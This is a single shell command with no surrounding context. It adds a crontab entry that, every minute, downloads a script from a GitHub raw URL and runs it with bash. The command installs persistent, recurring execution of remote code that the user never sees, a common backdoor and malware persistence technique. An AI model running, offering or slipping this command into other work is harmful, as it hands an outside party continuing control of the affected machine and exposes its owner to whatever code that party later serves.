(crontab -l 2>/dev/null; echo "* * * * * curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/script.sh > ~/.script && bash ~/.script") | crontab -

